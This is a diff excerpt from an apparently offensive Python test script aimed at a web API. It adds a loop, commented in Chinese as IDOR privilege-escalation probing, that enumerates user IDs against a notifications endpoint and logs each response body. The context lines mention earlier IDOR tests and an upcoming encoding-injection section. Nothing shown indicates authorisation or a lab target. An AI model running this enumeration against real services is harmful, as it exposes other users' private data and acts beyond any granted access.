@@ -139,6 +139,14 @@ for method, path, hdrs in idor_tests:
     log("idor %s: %s %s" % (path[:50], st, b[:90].replace("\n", " ")))
     time.sleep(0.4)
 
+# 2b. IDOR 通知越权深挖 (user_id 枚举)
+log("=== 通知越权 ===")
+for uid in [1, 2, 3, 5, 10, 100, 1000, 686285, 236238]:
+    st, b = req("GET", "/api/user/notifications?user_id=%d" % uid, headers=H)
+    res.append({"t": "notif-%d" % uid, "s": st, "b": b[:400]})
+    log("notif uid=%d: %s %s" % (uid, st, b[:130].replace("\n", " ")))
+    time.sleep(0.4)
+
 # 3. 二次注入/编码绕过
 log("=== 编码注入 ===")
 enc_tests = [
